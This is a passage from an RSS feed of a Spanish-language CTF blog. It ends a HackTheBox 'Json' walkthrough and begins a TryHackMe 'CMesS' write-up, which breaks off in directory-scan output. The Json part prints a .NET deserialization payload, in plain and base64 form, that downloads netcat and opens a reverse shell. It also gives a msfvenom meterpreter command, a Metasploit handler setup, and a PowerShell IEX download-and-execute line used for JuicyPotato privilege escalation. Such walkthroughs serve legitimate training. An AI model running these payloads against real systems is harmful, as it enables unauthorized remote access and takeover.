&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;&amp;#39;$type&amp;#39;:&amp;#39;System.Windows.Data.ObjectDataProvider,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PresentationFramework,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Version=4.0.0.0,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Culture=neutral,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PublicKeyToken=31bf3856ad364e35&amp;#39;,&lt;/span&gt; 
    &lt;span class=&#34;err&#34;&gt;&amp;#39;MethodName&amp;#39;:&amp;#39;Start&amp;#39;,&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;&amp;#39;MethodParameters&amp;#39;:{&lt;/span&gt;
        &lt;span class=&#34;err&#34;&gt;&amp;#39;$type&amp;#39;:&amp;#39;System.Collections.ArrayList,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;mscorlib,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Version=4.0.0.0,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Culture=neutral,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PublicKeyToken=b77a5c561934e089&amp;#39;,&lt;/span&gt;
        &lt;span class=&#34;err&#34;&gt;&amp;#39;$values&amp;#39;:[&amp;#39;cmd&amp;#39;,&amp;#39;/c&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;&amp;#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/Users/Public/nc.exe&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;cmd.exe&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.10&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;14.147&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7878&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;]&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;&amp;#39;ObjectInstance&amp;#39;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;$type&amp;#39;:&amp;#39;System.Diagnostics.Process,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;System,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Version=4.0.0.0,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Culture=neutral,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PublicKeyToken=b77a5c561934e089&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Payload Base64:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcG93ZXJzaGVsbCAtQ29tbWFuZCAiSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovLzEwLjEwLjE0LjE0Ny9uYy5leGUgLU91dEZpbGUgYzovVXNlcnMvUHVibGljL25jLmV4ZSIgJiBDOi9Vc2Vycy9QdWJsaWMvbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMTQ3IDc4NzggJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0NCg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Codificamos el payload en base64 y lo enviamos, y obtenemos una shell inversa con el usuario userpool.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-04%2001.12.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-04%2001.13.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeracion de los privilegios del usuario userpool, vemos que tenemos habilitado&lt;br /&gt;
SeImpersonatePrivilege, para esta maquina y estos privilegios utilizamos JuicyPotato. Utilizamos la forma &amp;ldquo;automatica&amp;rdquo; de &lt;a href=&#34;https://github.com/TsukiCTF/Lovely-Potato&#34;&gt;&lt;strong&gt;JuicyPotato&lt;/strong&gt;&lt;/a&gt;. Realizamos las siguientes modificaciones en los archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-LovelyPotato&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$RemoteDir&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.14.147&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$LocalPath&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:/Users/Public&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos nuestro payload con Msfvenom:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.10.14.147 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; -f exe -o meterpreter.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Configuramos metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;use exploit/multi/handler
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; PAYLOAD windows/meterpreter/reverse_tcp
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LHOST 10.10.14.147
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Descargamos el archivo de &amp;ldquo;automatizacion&amp;rdquo; de JuicyPotato:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;powershell -Command &lt;span class=&#34;s2&#34;&gt;&amp;#34;IEX(New-Object Net.WebClient).DownloadString(&amp;#39;http://10.10.14.147/Invoke-LovelyPotato.ps1&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Si queremos realizarlo de forma manual podemos realizar los mismos pasos de la Maquina &lt;a href=&#34;https://sckullbock.blogspot.com/2019/05/hackthebox-conceal-writeup.html&#34;&gt;&lt;strong&gt;Conceal&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Al terminar la ejecucion del script obtenemos nuestra shell en meterpreter.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-04%2001.45.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-04%2001.46.29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/json/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/json/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - CMesS</title>
        <link>https://sckull.github.io/posts/cmess/</link>
        <pubDate>Sat, 15 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 15 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/cmess/</guid>
        <description>CMesS es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;CMesS es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/cmess/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;CMesS&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Can you root this Gila CMS box?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;1155&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Optional&#34;&gt;Optional&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Feb 14 16:24:08 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.46.144&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.46.144
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: Gila CMS
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; disallowed entries 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/src/ /themes/ /lib/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Feb 14 16:45:03 2020 -- 1 IP address (1 host up) scanned in 1254.76 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;A un principio veimas Gila CMS en el cual existe una vulnerabilidad de LFI pero el de esta maquina no es vulnerable.&lt;br /&gt;
&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_184137.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Encontramos una larga lista de directorios, pero ninguno era de importancia hasta el momento.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/cmess# gobuster dir -u cmess.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt; 
/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/about &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/01 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/search &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/blog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/category &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/feed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/themes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tag &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/author &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/sites &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/log &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tags &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1x1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lib &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/src &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/api &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/001 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1pix &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
